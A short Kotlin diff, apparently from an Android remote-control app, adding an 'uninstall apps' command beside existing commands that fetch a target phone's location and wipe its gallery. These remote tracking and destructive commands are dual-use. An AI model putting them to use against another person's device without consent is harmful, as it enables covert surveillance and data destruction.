@@ -59,6 +59,7 @@ class ControllerActionsVm @Inject constructor(
                     is ControllerTabAction.OnLocationFetch -> sendMessageRequestFromController(action.number, MessageFromController.GET_LOCATION,email)
                     is ControllerTabAction.OnTabSelected -> return@launch
                     is ControllerTabAction.OnWipeGallery -> sendMessageRequestFromController(action.number, MessageFromController.WIPE_GALLERY,email)
+                    is ControllerTabAction.OnUninstallClicked -> sendMessageRequestFromController(action.number, MessageFromController.UNINSTALL_APPS,email)
                 }
                 when(result){
                     is Result.Error -> {
